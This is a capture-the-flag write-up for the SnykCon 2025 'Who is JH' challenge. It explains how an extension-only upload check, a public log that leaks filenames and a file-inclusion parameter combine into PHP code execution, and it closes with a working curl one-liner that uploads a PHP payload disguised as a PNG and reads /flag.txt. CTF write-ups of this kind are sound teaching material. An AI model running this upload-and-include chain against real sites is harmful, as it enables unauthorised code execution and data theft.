# Who is JH 
![image](https://github.com/user-attachments/assets/f77bfdd4-920f-4933-ae6c-05b8ae41176b)

Attachment: [challenge.zip](https://github.com/LazyTitan33/CTF-Writeups/raw/refs/heads/main/SnykCon2025/attachments/who-is-jh.zip)

## Writeup

In the Dockerfile, I can see where the flag is:  

![image](https://github.com/user-attachments/assets/7df0f550-d666-4066-afe8-f1316a3e2fb8)

I can also see that some PHP functions are disabled to prevent RCE:  

![image](https://github.com/user-attachments/assets/5a536885-04c1-4368-9d28-25f9899fde3e)

In the source code, I can see that there is a publicly accessible log file that I can reference:  

![image](https://github.com/user-attachments/assets/7654c2b4-0075-46ee-80c4-3124414fb102)

Indeed, when I access it, I can see the name of the file that I uploaded:  

![image](https://github.com/user-attachments/assets/740869ff-e38c-4638-9736-065268686db5)

This is helpful because it is using `uniqid` to generate a unique name, but the file upload otherwise is not very restricted. The extension is checked, but the content isn't:  

![image](https://github.com/user-attachments/assets/f87e50d8-144e-472f-aa47-74b39c9c64f1)

Continuing the code analysis, I can see that the conspiracy endpoint allows the user to include a file based on the language parameter:  

![image](https://github.com/user-attachments/assets/b8aeedab-388e-40e5-b246-4800f1bd2592)

Putting all of these together, it means we have a valid attack chain to upload a `file.png` with PHP code, use the log to figure out the random name it was given and then use the conspiracy endpoint to include it and run our code.

![image](https://github.com/user-attachments/assets/5575ce45-20cb-45ab-9d53-5962b7ac3f17)

I can get the flag with this oneliner:  

```bash
echo '<?php echo file_get_contents("/flag.txt")?>' | curl -s -X POST -F "image=@-;filename=test.png" http://challenge.ctf.games:31952/upload.php 1>/dev/null; file=$(curl -s 'http://challenge.ctf.games:31952/logs/site_log.txt'|tail -n 1|awk '{print $5}');curl -s "http://challenge.ctf.games:31952/conspiracy.php?language=uploads/$file"|grep flag
```

flag{6558608db040d1c64358ad536a8e06c6}
